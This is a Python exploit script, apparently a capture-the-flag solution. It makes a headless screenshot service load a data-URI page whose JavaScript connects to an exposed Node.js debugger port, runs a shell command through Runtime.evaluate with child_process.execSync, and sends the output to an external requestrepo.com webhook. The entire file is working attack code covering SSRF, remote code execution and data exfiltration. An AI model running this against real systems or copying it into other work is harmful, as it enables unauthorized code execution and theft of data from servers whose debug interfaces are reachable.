import base64
import requests
from urllib.parse import quote

BASE_URL = "http://localhost:50000"
NODE_DEBUG_ID = "72d7658c-6b8b-4efb-a064-6c57825a906f"
ADMIN_TOKEN = "6be49656da82bdb7e031ae5fd149483d5478814fc183eef08291f49ca11927e4"
WEBHOOK_URL = "https://gvk9aok7.requestrepo.com/"

# f-strings not working..
payload = """
<script>
window.ws = new WebSocket('ws://127.0.0.1:9229/%s')
ws.onerror = (e) => {
    fetch("%s?e=" + btoa(e.toString()))
}
ws.onmessage = (e) => {
    fetch("%s?e=" + btoa(e.data))
}
ws.onopen = () => {
    ws.send(JSON.stringify({
        id: 1,
        method: "Runtime.evaluate",
        params: {
            includeCommandLineAPI: true, 
            expression: `(function(){
                res = require("child_process").execSync("/app/readflag" ); 
                return new TextDecoder().decode(res);
            })();`
        }
    }))
}    
</script>
""" % (
    NODE_DEBUG_ID,
    WEBHOOK_URL,
    WEBHOOK_URL,
)

data_uri = "data:text/html;base64," + quote(quote(base64.b64encode(payload.encode())))

res = requests.get(
    BASE_URL + "/shot?url=" + data_uri + "&admin=" + ADMIN_TOKEN, timeout=20
)

print("Status code:", res.status_code)
